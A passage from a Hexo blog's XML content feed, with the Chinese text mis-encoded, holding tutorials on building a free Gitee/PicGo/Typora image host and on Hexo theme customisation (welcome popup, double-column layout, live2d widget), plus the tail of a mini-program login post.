æ˜¯å¦è¿‡æœŸã€‚æ‰€ä»¥å¯ä»¥é€šè¿‡è¿™ä¸ªæ¥ä½œä¸ºä¿å­˜ç”¨æˆ·ç™»å½•æ€çš„æœºåˆ¶ï¼Œè¿™ä¹Ÿæ˜¯å°ç¨‹åºæ–‡æ¡£ä¸­æ¨èçš„æ–¹æ³•ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405051947710.png" alt="image-20240505194743677"> </p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> å°ç¨‹åº </tag>
            
            <tag> sessionkey </tag>
            
            <tag> unionid </tag>
            
            <tag> å°ç¨‹åºç™»å½•&amp;æˆæƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Giteeæ­å»ºå…è´¹å›¾åºŠ</title>
      <link href="/2024/04/17/Gitee%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E5%9B%BE%E5%BA%8A/"/>
      <url>/2024/04/17/Gitee%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E5%9B%BE%E5%BA%8A/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä¸ºä»€ä¹ˆè¦æ­å»ºå›¾åºŠï¼Ÿï¼Ÿï¼Ÿ</p><ol><li>hexoé»˜è®¤å¯ä»¥åŠ è½½æœ¬åœ°æ–‡ä»¶å¤¹å’Œå¤–éƒ¨URLçš„å›¾ç‰‡ï¼Œæ­å»ºå›¾åºŠåä¸»è¦ç”¨æ¥å­˜å‚¨å›¾ç‰‡ï¼Œæ–¹ä¾¿ç®¡ç†ï¼›</li><li>å¯ä»¥å°†mdæ–‡ä»¶+å¯¹åº”è·¯å¾„å›¾ç‰‡æ‰“åŒ…ï¼Œæ–¹ä¾¿ç®¡ç†ï¼›</li><li>å¯ç§»æ¤æ€§å¼ºã€‚</li></ol><p>è¿˜æœ‰ä¸€ä¸ªåŸå› ï¼Œè¿™ç©æ„å…è´¹å•Šï¼ï¼ï¼</p><p>â€‹Typora+PicGo+Giteeå®ç°å›¾ç‰‡ä¸Šä¼ åŠŸèƒ½<br>â€‹æŠ“ç´§æ—¶é—´æ­¥å…¥æ­£é¢˜ï¼ŒGoï¼</p><h1 id="ç¬¬ä¸€æ­¥-é…ç½®Giteeä»“åº“"><a href="#ç¬¬ä¸€æ­¥-é…ç½®Giteeä»“åº“" class="headerlink" title="ç¬¬ä¸€æ­¥ é…ç½®Giteeä»“åº“"></a>ç¬¬ä¸€æ­¥ é…ç½®Giteeä»“åº“</h1><p>1ã€é™„ä¸Š<a href="https://gitee.com/">ç äº‘gitee</a>åœ°å€</p><p>2ã€æ³¨å†Œç™»å½•è‡ªå·±çš„giteeè´¦å·</p><p>3ã€åˆ›å»ºä»“åº“ï¼Œä»“åº“è¦æ±‚å…¬å¼€ï¼Œsoè¦ä¸Šä¼ åˆæ³•å›¾ç‰‡å“’~</p><ul><li>æ­¥éª¤ä¸€ï¼šåˆ›å»ºä»“åº“</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404170937885.png" alt="image-20240417093654778"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404170941548.png" alt="image-20240417094102500"> </p><ul><li>æ­¥éª¤äºŒï¼šç”Ÿæˆç§äººä»¤ç‰Œï¼ˆè¯·åœ¨å¤‡å¿˜å½•ä¸­è®°ä¸‹ç”Ÿæˆçš„ç§äººä»¤ç‰Œ ï¼‰</li></ul><p>æ‰“å¼€â€œä¸ªäººä¸»é¡µâ€â€”&gt;â€œä¸ªäººè®¾ç½®â€â€”-&gt;â€œç§äººä»¤ç‰Œâ€</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404170942484.png" alt="image-20240417094222456"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404170943977.png" alt="image-20240417094311937"> </p><p>ç‚¹å‡» â€œç”Ÿæˆæ–°çš„ä»¤ç‰Œâ€ ï¼Œæäº¤åï¼Œå°†ç”Ÿæˆçš„ç§äººä»¤ç‰Œä¿å­˜å¥½ï¼Œåé¢ä¼šç”¨åˆ°ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404170946003.png" alt="image-20240417094637966">  </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404170947800.png" alt="image-20240417094732760"> </p><h1 id="ç¬¬äºŒæ­¥-PicGoçš„ä¸‹è½½åŠç›¸å…³é…ç½®"><a href="#ç¬¬äºŒæ­¥-PicGoçš„ä¸‹è½½åŠç›¸å…³é…ç½®" class="headerlink" title="ç¬¬äºŒæ­¥ PicGoçš„ä¸‹è½½åŠç›¸å…³é…ç½®"></a>ç¬¬äºŒæ­¥ PicGoçš„ä¸‹è½½åŠç›¸å…³é…ç½®</h1><p>ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/Molunerfinn/PicGo/releases">https://github.com/Molunerfinn/PicGo/releases</a></p><p><strong>1ã€é¦–å…ˆï¼Œä¸‹è½½PicGoçš„å®‰è£…åŒ…</strong></p><p><a href="https://picgo.github.io/PicGo-Doc/zh/guide/#%E5%BA%94%E7%94%A8%E6%A6%82%E8%BF%B0">PicGoå®˜ç½‘æŒ‡å—</a><br>ä¸€ä¸ªå›¾åºŠï¼Œä¸€ä¸ªç”¨äºå¿«é€Ÿä¸Šä¼ å›¾ç‰‡å¹¶è·å–å›¾ç‰‡URLé“¾æ¥çš„å·¥å…·ï¼Œä¹Ÿå®Œå…¨å…è´¹ã€‚</p><p><strong>2ã€å…¶æ¬¡ï¼Œåœ¨PicGoä¸­å®‰è£…æ’ä»¶</strong></p><p>å¸¸è§é—®é¢˜ï¼š</p><p>\1. å®‰è£…æ’ä»¶ä¸€ç›´æ˜¾ç¤ºâ€œå®‰è£…ä¸­â€ï¼›</p><p>\2. ä½¿ç”¨npmå‘½ä»¤å®‰è£…æ’ä»¶æç¤ºï¼š npmä¸æ˜¯å†…éƒ¨æˆ–å¤–éƒ¨å‘½ä»¤ï¼Œä¹Ÿä¸æ˜¯å¯è¿è¡Œçš„ç¨‹åº</p><p>è§£å†³ï¼šNode.jså®‰è£…åŠç¯å¢ƒé…ç½®ï¼Œè¿™ä¸ªå¿…é¡»é…ç½®çš„ï¼ï¼</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404171006115.png" alt="image-20240417100629083"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404171020809.png" alt="image-20240417102035779"> </p><p><strong>4ã€æœ€åï¼Œå®ŒæˆPicGoçš„ç›¸å…³é…ç½®</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404171024030.png" alt="image-20240417102414003"> </p><p>æç¤ºâ€œè®¾ç½®æˆåŠŸâ€å³å¯ï¼Œé…ç½®å¥½åè¿›è¡Œ<strong>é‡å¯ï¼ï¼ï¼ï¼ï¼ï¼</strong><br>éšåï¼Œè®¾ç½®PicGoæ—¶ï¼Œå…ˆé€‰æ‹©æ˜¾ç¤ºçš„å›¾åºŠä¸ºgiteeï¼Œå†ä¸Šç¿»è¿›è¡Œè®¾ç½®Server</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404171050897.png" alt="image-20240417105056869"> </p><p>è®¾ç½®æˆåŠŸååœ¨â€œä¸Šä¼ åŒºâ€æµ‹è¯•å›¾ç‰‡æ˜¯å¦èƒ½å¤ŸæˆåŠŸä¸Šä¼ ï¼Œå¤šè¯•å‡ å¼ å›¾ç‰‡æˆ–è€…é‡å¯PicGoçœ‹çœ‹</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404171051216.png" alt="image-20240417105117184"> </p><h1 id="ç¬¬ä¸‰æ­¥-Typoraçš„ä¸‹è½½åŠç›¸å…³é…ç½®"><a href="#ç¬¬ä¸‰æ­¥-Typoraçš„ä¸‹è½½åŠç›¸å…³é…ç½®" class="headerlink" title="ç¬¬ä¸‰æ­¥ Typoraçš„ä¸‹è½½åŠç›¸å…³é…ç½®"></a>ç¬¬ä¸‰æ­¥ Typoraçš„ä¸‹è½½åŠç›¸å…³é…ç½®</h1><p>typoraæ˜¯ä¸€æ¬¾æ”¯æŒå®æ—¶é¢„è§ˆçš„Markdownæ–‡æœ¬ç¼–è¾‘å™¨ï¼Œ å¹¶ä¸”å®Œå…¨å…è´¹<br>ä¸‹è½½åœ°å€ï¼š <a href="https://www.typora.io/">typora</a></p><p>æ–‡ä»¶â€”&gt;åå¥½è®¾ç½®â€“&gt;é…ç½®PicGoè·¯å¾„</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404171052201.png" alt="image-20240417105231175"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404171053000.png" alt="image-20240417105306966"> </p><p>ä¸Šä¼ å›¾ç‰‡ä¹‹åï¼Œå›¾ç‰‡åœ°å€æŒ‡å‘ç äº‘ä»“åº“å¹¶ä¸”æç¤ºä¸Šä¼ æˆåŠŸå°±å¯äº†ã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>è¿™æ ·ï¼Œå°±å¯ä»¥å®ç°ï¼Œå½“ä½¿ç”¨Typoraå†™æ–‡æ¡£çš„æ—¶å€™ï¼Œæ— è®ºä¸Šä¼ æœ¬åœ°&amp;è¿œç¨‹çš„å›¾ç‰‡ï¼Œå¤åˆ¶è¿‡æ¥åï¼Œä¼šè‡ªåŠ¨é€šè¿‡PicGoä¸Šä¼ åˆ°giteeä¸­ã€‚</p><p>Typoraâ€”â€”&gt;PicGoâ€”â€”&gt;Gitee</p><p> <img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404171057563.png" alt="image-20240417105744532"> </p><p>åŒç†ï¼Œå¯ä»¥çœ‹åˆ°hexoä¸­çš„å›¾ç‰‡åŠ è½½é»˜è®¤å°±æ˜¯ä»giteeä¸­è·å–äº†ï¼ï¼ï¼</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404171100384.png" alt="image-20240417110017307"> </p>]]></content>
      
      
      <categories>
          
          <category> åšå®¢æ­å»º </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å›¾åºŠ </tag>
            
            <tag> åšå®¢ç¾åŒ– </tag>
            
            <tag> Gitee </tag>
            
            <tag> Picgo </tag>
            
            <tag> typora </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexoä¸»é¢˜ç¾åŒ–(ç»­)</title>
      <link href="/2024/04/11/hexo%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96-%E7%BB%AD/"/>
      <url>/2024/04/11/hexo%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96-%E7%BB%AD/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="hexoå¼¹å‡ºæ¬¢è¿å¼¹çª—"><a href="#hexoå¼¹å‡ºæ¬¢è¿å¼¹çª—" class="headerlink" title="hexoå¼¹å‡ºæ¬¢è¿å¼¹çª—"></a>hexoå¼¹å‡ºæ¬¢è¿å¼¹çª—</h1><h2 id="é€‰æ‹©ä¸€ä¸ªå¥½çœ‹çš„å¼¹çª—"><a href="#é€‰æ‹©ä¸€ä¸ªå¥½çœ‹çš„å¼¹çª—" class="headerlink" title="é€‰æ‹©ä¸€ä¸ªå¥½çœ‹çš„å¼¹çª—"></a>é€‰æ‹©ä¸€ä¸ªå¥½çœ‹çš„å¼¹çª—</h2><p>é¦–å…ˆï¼Œæ—¢ç„¶è¦å¼¹çª—ï¼Œå°±è¦å¥½çœ‹ï¼Œè€Œä¸æ˜¯JavaScripté‡Œçš„alert()å‡½æ•°ã€‚</p><p>è¿™å—å‚è€ƒç½‘ä¸Šæ–‡ç« åï¼Œé€‰å®šä½¿ç”¨sweetAlertæ¥å®ç°å¼¹çª—ï¼ˆ<a href="https://sweetalert.js.org/">SweetAlert</a>ï¼‰ï¼Œæ„Ÿè§‰ä¸é”™ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404111531919.png" alt="img"></p><h3 id="è·å–å…¶JavaScriptå’ŒCSSæ–‡ä»¶"><a href="#è·å–å…¶JavaScriptå’ŒCSSæ–‡ä»¶" class="headerlink" title="è·å–å…¶JavaScriptå’ŒCSSæ–‡ä»¶"></a>è·å–å…¶JavaScriptå’ŒCSSæ–‡ä»¶</h3><p>é¦–å…ˆï¼Œéœ€è¦å°†sweetalert.jså’Œsweetalert.cssæ”¾åˆ°è‡ªå·±åšå®¢ä¸‹ã€‚</p><h3 id="æ–°å»ºJavaScriptæ–‡ä»¶å¤¹"><a href="#æ–°å»ºJavaScriptæ–‡ä»¶å¤¹" class="headerlink" title="æ–°å»ºJavaScriptæ–‡ä»¶å¤¹"></a>æ–°å»ºJavaScriptæ–‡ä»¶å¤¹</h3><p>åœ¨åšå®¢æ ¹ç›®å½•å¾€ä¸‹æ‰¾åˆ°\themes\next\source\jsæ–‡ä»¶å¤¹ï¼Œæ–°å»ºsweetalert.jsï¼Œæ–‡ä»¶å†…å®¹<a href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://blog.pai233.top/js/sweetalert.js&source=article&objectId=1933199">è¯·çœ‹è¿™é‡Œ</a>ï¼Œè§‰å¾—å¤åˆ¶éº»çƒ¦çš„å¯ä»¥ç›´æ¥æŒ‰Crtl+Sè¿›è¡Œä¿å­˜ã€‚</p><h3 id="æ–°å»ºCSSæ–‡ä»¶"><a href="#æ–°å»ºCSSæ–‡ä»¶" class="headerlink" title="æ–°å»ºCSSæ–‡ä»¶"></a>æ–°å»ºCSSæ–‡ä»¶</h3><p>åœ¨åšå®¢æ ¹ç›®å½•å¾€ä¸‹æ‰¾åˆ°\themes\next\source\cssæ–‡ä»¶å¤¹ï¼Œæ–°å»ºsweetalert.cssï¼Œæ–‡ä»¶å†…å®¹<a href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://blog.pai233.top/css/sweetalert.css&source=article&objectId=1933199">è¯·çœ‹è¿™é‡Œ</a>ã€‚</p><h2 id="å¼•å…¥åˆ°ä¸»é¢˜ä¸­"><a href="#å¼•å…¥åˆ°ä¸»é¢˜ä¸­" class="headerlink" title="å¼•å…¥åˆ°ä¸»é¢˜ä¸­"></a>å¼•å…¥åˆ°ä¸»é¢˜ä¸­</h2><p>æ‰“å¼€\themes\next\layout_layout.swigï¼Œåœ¨<head>æ ‡ç­¾å†…æ’å…¥ä»¥ä¸‹è¯­å¥ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;/js/sweetalert.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;/css/sweetalert.css&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å®Œæˆäº†å¼•å…¥ã€‚</p><h2 id="è‡ªåŠ¨å¼¹çª—"><a href="#è‡ªåŠ¨å¼¹çª—" class="headerlink" title="è‡ªåŠ¨å¼¹çª—"></a>è‡ªåŠ¨å¼¹çª—</h2><p>åœ¨åšå®¢æ ¹ç›®å½•å¾€ä¸‹æ‰¾åˆ°\themes\next\source\jsæ–‡ä»¶å¤¹ï¼Œæ–°å»ºwelcome.jsï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">function <span class="title function_">welcome</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">let</span> <span class="variable">welcome_text</span> <span class="operator">=</span> <span class="string">&#x27;æ¬¢è¿å…‰é¡¾xxxçš„å°çª~&#x27;</span></span><br><span class="line">    <span class="keyword">if</span>(document.referrer!==<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">        let referrer=document.referrer.split(<span class="string">&quot;/&quot;</span>)[<span class="number">2</span>];</span><br><span class="line">        welcome_text=<span class="string">&quot;æ¬¢è¿ä½ ï¼Œæ¥è‡ª&quot;</span>+referrer.toUpperCase()+<span class="string">&quot;çš„ç”¨æˆ·ï¼&quot;</span>;<span class="comment">//è·å–ç”¨æˆ·æ¥æºåŸŸå</span></span><br><span class="line">    &#125;</span><br><span class="line">    swal(&#123;</span><br><span class="line">        title: <span class="string">&quot; æ¬¢è¿ï¼&quot;</span>,</span><br><span class="line">        text: welcome_text+<span class="string">&#x27;\næ‰“å¼€é¡µé¢ä¸‹æ–¹éŸ³ä¹ä»¥è·å¾—æ›´ä½³ä½“éªŒï¼&#x27;</span>,<span class="comment">//æ¬¢è¿æ–‡æœ¬ï¼Œå¯è‡ªè¡Œä¿®æ”¹</span></span><br><span class="line">        imageUrl: <span class="string">&quot;/images/avatar.jpg&quot;</span>,<span class="comment">//å›¾ç‰‡ï¼Œè‡ªè¡Œä¿®æ”¹ä½ç½®</span></span><br><span class="line">        timer: <span class="number">3000</span>,<span class="comment">//å¼¹å‡ºæ—¶é—´</span></span><br><span class="line">        showConfirmButton: <span class="literal">false</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">$(document).ready(()=&gt;&#123;<span class="comment">//è‹¥æœªå¼•ç”¨JQueryï¼Œè¯·å¼•ç”¨</span></span><br><span class="line">    welcome()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å¤§åŠŸå‘Šæˆäº†~~~</p><h1 id="åŒæ å¸ƒå±€"><a href="#åŒæ å¸ƒå±€" class="headerlink" title="åŒæ å¸ƒå±€"></a>åŒæ å¸ƒå±€</h1><p>é»˜è®¤æƒ…å†µï¼Œåšå®¢æ–‡ç« æ˜¯å•æ å¸ƒå±€çš„ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404111532739.png" alt="img"> </p><p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡æ’ä»¶ â€œhexo-butterfly-article-double-rowâ€ å°†å…¶è°ƒæ•´ä¸ºåŒæ å¸ƒå±€ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404111533993.png" alt="image.png"> </p><p>é¦–å…ˆæ‰§è¡Œä»¥ä¸‹çš„å‘½ä»¤</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">npm i hexo-butterfly-article-<span class="type">double</span>-row --save</span><br></pre></td></tr></table></figure><p>åœ¨ç½‘ç«™çš„æ ¹é…ç½®æ–‡ä»¶ä¸‹æ·»åŠ ä»¥ä¸‹çš„ä»£ç </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#åŒæ ç¾åŒ–</span><br><span class="line">butterfly_article_double_row:</span><br><span class="line">  enable: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>ã€é‡è¦ã€‘è¿™å—æœ‰ä¸ªç‚¹ä¸€å®šè¦æ³¨æ„ï¼Œæ˜¯åœ¨æˆ‘ä»¬é»˜è®¤çš„æ ¹é…ç½®æ–‡ä»¶ _config.yml ä¸­æ·»åŠ ä¸Šè¿°ä»£ç ï¼Œè€Œä¸æ˜¯åœ¨ä¸»é¢˜é…ç½®æ–‡ä»¶ä¸­ï¼Œå¦‚æœé…ç½®åœ¨ä¸»é¢˜æ–‡ä»¶ä¸­åç»­hexoä¸€é”®ä¸‰è¿çš„æ—¶å€™ä¼šæŠ¥é”™ï¼Œè§£ææœ‰é—®é¢˜ï¼š</p><p>â€œCannot read property â€˜enableâ€™ of undefinedâ€</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404111532633.png" alt="img"> </p><p>è¿™æ ·ä¹‹åï¼Œå¯ä»¥æˆåŠŸåˆ‡æ¢åŒæ äº†ï¼Œä½†æœ‰ä¸ªbugï¼Œé¡µé¢æ¯”è¾ƒä¸‘ï¼Œä¸”é¡µç æ˜¯æœ‰é—®é¢˜çš„</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404111532753.png" alt="img"> </p><p>é€šè¿‡æ‰’å–å…¶ä»–åšä¸»çš„çš„æ ·å¼ä»£ç ï¼Œå‘ç°æœ‰äº›åœ°æ–¹éœ€è¦æ”¹ä¸€ä¸‹ï¼Œåœ¨\themes\butterfly\source\cssç›®å½•ä¸‹æ–°å»ºæ–‡ä»¶mycss.cssï¼ˆä¸€èˆ¬å­˜è‡ªå·±çš„ä¸€äº›æ ·å¼ä»£ç ï¼Œæˆ–è€…æƒ³æœ¬æ¡ˆä¾‹ä¸­éœ€è¦åšä¸€äº›è°ƒæ•´çš„æ ·å¼ä»£ç ï¼‰,æ·»åŠ ä»¥ä¸‹ä»£ç ï¼š</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#recent-posts</span>&gt;<span class="selector-class">.recent-post-item</span>&#123;</span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">30px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.layout</span> <span class="selector-id">#recent-posts</span>&gt;<span class="selector-class">.recent-post-item</span> <span class="selector-class">.post_cover</span>&#123;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">280px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#recent-posts</span>&gt;<span class="selector-class">.recent-post-item</span>&gt;<span class="selector-class">.recent-post-info</span>&#123;</span><br><span class="line"><span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">40px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.layout</span> <span class="selector-id">#recent-posts</span>&gt;<span class="selector-class">.recent-post-item</span>&gt;<span class="selector-class">.recent-post-info</span>&gt;<span class="selector-class">.article-title</span>&#123;</span><br><span class="line"><span class="attribute">font-size</span>: <span class="number">1.6em</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#recent-posts</span>&gt;<span class="selector-class">.recent-post-item</span>&gt;<span class="selector-class">.recent-post-info</span>&gt;<span class="selector-class">.article-meta-wrap</span>&#123;</span><br><span class="line"><span class="attribute">font-size</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#pagination</span> &#123;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">1rem</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#pagination</span> <span class="selector-class">.page-number</span>&#123;</span><br><span class="line"><span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">8px</span> <span class="number">16px</span> -<span class="number">4px</span> <span class="number">#2c2d300c</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.layout</span>&gt;<span class="selector-class">.recent-posts</span> <span class="selector-class">.pagination</span>&gt;<span class="selector-pseudo">:not</span>(<span class="selector-class">.space</span>)&#123;</span><br><span class="line"><span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">8px</span> <span class="number">16px</span> -<span class="number">4px</span> <span class="number">#2c2d300c</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒæ—¶åœ¨ä¸»é¢˜é…ç½®ç›®å½•injectå­—æ®µä¸‹å¼•å…¥mycss.cssæ–‡ä»¶</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">inject</span><br><span class="line">    - &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;/css/mycss.css&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>å†æ¬¡æŸ¥çœ‹æ•ˆæœ</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404111534081.png" alt="image.png"> </p><p>ä¸ªäººæ„Ÿè§‰åŒæ æ²¡æœ‰å•æ çœ‹ç€èˆ’æœï¼Œè¿™å—åªåšæ¼”ç¤ºã€‚ã€‚ã€‚</p><h1 id="æ·»åŠ å¡é€šäººç‰©"><a href="#æ·»åŠ å¡é€šäººç‰©" class="headerlink" title="æ·»åŠ å¡é€šäººç‰©"></a>æ·»åŠ å¡é€šäººç‰©</h1><p>å¯ä»¥ç»™åšå®¢æ·»åŠ ä¸€ä¸ªå¡é€šå® ç‰©ï¼Œè¿˜èƒ½æ ¹æ®ä½ é¼ æ ‡ä½ç½®æ‘‡å¤´ï¼Œç‚¹å‡»æ­¤å¤„ï¼ˆ<a href="https://github.com/EYHN/hexo-helper-live2d">ç‚¹å‡»æ­¤å¤„</a>ï¼‰è¿›å…¥é¡¹ç›®åœ°å€ï¼š</p><h2 id="åˆçº§ç‰ˆ"><a href="#åˆçº§ç‰ˆ" class="headerlink" title="åˆçº§ç‰ˆ"></a>åˆçº§ç‰ˆ</h2><p>å·²ç»å°è£…å¥½äº†æ’ä»¶ï¼Œä½†åªæ˜¯æ¨¡å‹ï¼Œä¸èƒ½è¯´è¯ã€ä¸èƒ½æ¢è£…ã€åŠŸèƒ½è¾ƒå°‘ã€‚</p><p>1ã€å®‰è£…æ¨¡å—</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-helper-live2d</span><br></pre></td></tr></table></figure><p>2ã€è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œä¸‹è½½ç›¸åº”çš„æ¨¡å‹ï¼Œå°† packagename æ›´æ¢æˆæ¨¡å‹åç§°å³å¯</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">npm install packagename  <span class="comment">//npm install live2d-widget-model-wanko</span></span><br></pre></td></tr></table></figure><p>å…·ä½“çš„packagenameå’Œå¯¹åº”å›¾ç‰‡å¯ä»¥<a href="https://blog.csdn.net/u012931864/article/details/83054822">ç‚¹å‡»æ­¤å¤„</a></p><p>3ã€åœ¨ ç«™ç‚¹é…ç½®æ–‡ä»¶ ä¸­æ–°å¢å¦‚ä¸‹å†…å®¹ï¼ˆè¿™å—è¦æ±‚å¿…é¡»æ˜¯ç«™ç‚¹é…ç½®æ–‡ä»¶ï¼Œä¸èƒ½æ˜¯ä¸»é¢˜é…ç½®æ–‡ä»¶ï¼‰ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># Live2D</span><br><span class="line">## https:<span class="comment">//github.com/EYHN/hexo-helper-live2d</span></span><br><span class="line">live2d:</span><br><span class="line">  enable: <span class="literal">true</span></span><br><span class="line">  # enable: <span class="literal">false</span></span><br><span class="line">  scriptFrom: local # é»˜è®¤</span><br><span class="line">  pluginRootPath: live2dw/ # æ’ä»¶åœ¨ç«™ç‚¹ä¸Šçš„æ ¹ç›®å½•(ç›¸å¯¹è·¯å¾„)</span><br><span class="line">  pluginJsPath: lib/ # è„šæœ¬æ–‡ä»¶ç›¸å¯¹ä¸æ’ä»¶æ ¹ç›®å½•è·¯å¾„</span><br><span class="line">  pluginModelPath: assets/ # æ¨¡å‹æ–‡ä»¶ç›¸å¯¹ä¸æ’ä»¶æ ¹ç›®å½•è·¯å¾„</span><br><span class="line">  # scriptFrom: jsdelivr # jsdelivr CDN</span><br><span class="line">  # scriptFrom: unpkg # unpkg CDN</span><br><span class="line">  # scriptFrom: https:<span class="comment">//cdn.jsdelivr.net/npm/live2d-widget@3.x/lib/L2Dwidget.min.js # ä½ çš„è‡ªå®šä¹‰ url</span></span><br><span class="line">  tagMode: <span class="literal">false</span> # æ ‡ç­¾æ¨¡å¼, æ˜¯å¦ä»…æ›¿æ¢ live2d tagæ ‡ç­¾è€Œéæ’å…¥åˆ°æ‰€æœ‰é¡µé¢ä¸­</span><br><span class="line">  debug: <span class="literal">false</span> # è°ƒè¯•, æ˜¯å¦åœ¨æ§åˆ¶å°è¾“å‡ºæ—¥å¿—</span><br><span class="line">  model:</span><br><span class="line">    use: live2d-widget-model-wanko # npm-<span class="keyword">module</span> <span class="keyword">package</span> name</span><br><span class="line">    # use: wanko # åšå®¢æ ¹ç›®å½•/live2d_models/ ä¸‹çš„ç›®å½•å</span><br><span class="line">    # use: ./wives/wanko # ç›¸å¯¹äºåšå®¢æ ¹ç›®å½•çš„è·¯å¾„</span><br><span class="line">    # use: https:<span class="comment">//cdn.jsdelivr.net/npm/live2d-widget-model-wanko@1.0.5/assets/wanko.model.json # ä½ çš„è‡ªå®šä¹‰ url</span></span><br><span class="line">  display:</span><br><span class="line">    position: right</span><br><span class="line">    width: <span class="number">150</span></span><br><span class="line">    height: <span class="number">300</span></span><br><span class="line">  mobile:</span><br><span class="line">    show: <span class="literal">false</span> # æ‰‹æœºä¸­æ˜¯å¦å±•ç¤º</span><br></pre></td></tr></table></figure><p>3ã€å±•ç¤ºå¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404111534918.png" alt="img"> </p><h2 id="è¿›é˜¶ç‰ˆ"><a href="#è¿›é˜¶ç‰ˆ" class="headerlink" title="è¿›é˜¶ç‰ˆ"></a>è¿›é˜¶ç‰ˆ</h2><p>ç½‘ä¸Šä¹Ÿæœ‰ä¸€äº›è¿›é˜¶ç‰ˆçš„å¡é€šäººç‰©å®ç°ï¼ŒåŠŸèƒ½é½å…¨ã€‚èƒ½è¯´è¯ã€èƒ½æ¢è£…ã€èƒ½ç©æ¸¸æˆã€èƒ½æ‹ç…§ã€è¿˜èƒ½è‡ªå®šä¹‰ã€‚</p><p>å…·ä½“å®ç°ï¼Œå¯ä»¥å‚è€ƒï¼š</p><p><a 